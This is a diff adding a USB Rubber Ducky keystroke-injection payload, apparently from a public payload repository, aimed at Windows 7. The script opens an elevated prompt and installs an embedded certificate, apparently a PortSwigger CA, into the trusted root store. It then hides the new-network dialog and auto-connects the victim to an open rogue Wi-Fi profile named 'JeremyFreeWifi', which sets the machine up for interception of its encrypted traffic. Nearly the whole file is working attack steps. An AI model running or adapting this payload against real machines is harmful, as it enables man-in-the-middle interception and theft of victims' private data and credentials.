@@ -1,0 +1,88 @@
+REM Author: jdorrough
+REM
+REM Description:Payload creates a certificate, adds cert to trusted root store, creates
+REM		a new wireless profile, connects to wireless profile
+REM
+REM Testcase: This payload tested using c_duck_v2.1.hex attacking Windows 7 Professional 
+REM
+DELAY 10000
+GUI r
+DELAY 200
+REM ***********************Uses code create by Hak5darren*******************************
+REM ***If user is not an admin this command simply opens a cmd prompt with user creds***
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 3000
+ALT y
+DELAY 500
+STRING cd %USERPROFILE%
+ENTER
+DELAY 50
+REM ******You will need to edit this section to replace with your generated cert********
+STRING copy con cert.cer
+ENTER
+STRING -----BEGIN CERTIFICATE-----
+ENTER
+STRING MIICxDCCAi2gAwIBAgIEVOdW+zANBgkqhkiG9w0BAQUFADCBijEUMBIGA1UEBhML
+ENTER
+STRING UG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0
+ENTER
+STRING U3dpZ2dlcjEUMBIGA1UEChMLUG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2ln
+ENTER
+STRING Z2VyIENBMRcwFQYDVQQDEw5Qb3J0U3dpZ2dlciBDQTAeFw0xNTAyMjAxNTQ3MDda
+ENTER
+STRING Fw0zNTAyMTUxNTQ3MDdaMIGKMRQwEgYDVQQGEwtQb3J0U3dpZ2dlcjEUMBIGA1UE
+ENTER
+STRING CBMLUG9ydFN3aWdnZXIxFDASBgNVBAcTC1BvcnRTd2lnZ2VyMRQwEgYDVQQKEwtQ
+ENTER
+STRING b3J0U3dpZ2dlcjEXMBUGA1UECxMOUG9ydFN3aWdnZXIgQ0ExFzAVBgNVBAMTDlBv
+ENTER
+STRING cnRTd2lnZ2VyIENBMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCNDepfyko9
+ENTER
+STRING ZYwpa85TefiyGVgXEkTqVOGjpICAx6OW2vLfY/pT9rEsZ8oHSessRyGW9S2gP6Lb
+ENTER
+STRING tzbFgmepWFixiEJAgsziwWUXcdKOMCNwhLwGR5R6XvtEOT//tUD/Qujo0VGQUtX0
+ENTER
+STRING Xta/vtsI/n4YZAKZLR3elOT7150AIVuF3wIDAQABozUwMzASBgNVHRMBAf8ECDAG
+ENTER
+STRING AQH/AgEAMB0GA1UdDgQWBBTSJrL4vz7JJPJ67CNmrwAnfuTs0zANBgkqhkiG9w0B
+ENTER
+STRING AQUFAAOBgQCBMulw4WP++I76bfvXQ4RAgNo0DYiasfw4SniawhnfpDE4spV1vjzf
+ENTER
+STRING IbQQVcetDdnCvSB6YVE0Rv3HQbTZE5r170dOvl4o6Yr3wgFF9sUUqQq+M/Z4wRgg
+ENTER
+STRING 8OJPgC8PXCmkelAO166m4w7h3DlnQj1cGNdQr5AmMksvEmDvioTz0A==
+ENTER
+STRING -----END CERTIFICATE-----
+ENTER
+CONTROL z
+ENTER
+DELAY 50
+STRING certutil -addstore -f -enterprise -user root cert.cer
+ENTER
+DELAY 150
+STRING del cert.cer
+ENTER
+DELAY 50
+REM ***********This command fails if user doesn't have admin creds****************************
+STRING REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowOff
+ENTER
+DELAY 50
+STRING echo ^<?xml version="1.0"?^> ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> ^<name^>JeremyFreeWifi^</name^> ^<SSIDConfig^> ^<SSID^> ^<hex^>4a6572656d792d4672656557696669^</hex^> ^<name^>Jeremy-FreeWifi^</name^> ^</SSID^> ^<nonBroadcast^>false^</nonBroadcast^> ^</SSIDConfig^> ^<connectionType^>ESS^</connectionType^> ^<connectionMode^>auto^</connectionMode^> ^<MSM^> ^<security^> ^<authEncryption^> ^<authentication^>open^</authentication^> ^<encryption^>none^</encryption^> ^<useOneX^>false^</useOneX^> ^</authEncryption^> ^</security^> ^</MSM^> ^</WLANProfile^> > a.xml
+ENTER
+DELAY 50
+REM *****Used code from Xcellerator's "Payload Pineapple Association (VERY FAST)**************
+STRING netsh wlan add profile filename="a.xml" interface="Wireless Network Connection"
+ENTER
+DELAY 50
+STRING netsh wlan connect name=JeremyFreeWifi
+ENTER
+DELAY 10000
+STRING REG DELETE HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowOff
+ENTER
+DELAY 50
+STRING Yes
+ENTER
+DELAY 50
+STRING exit
+ENTER
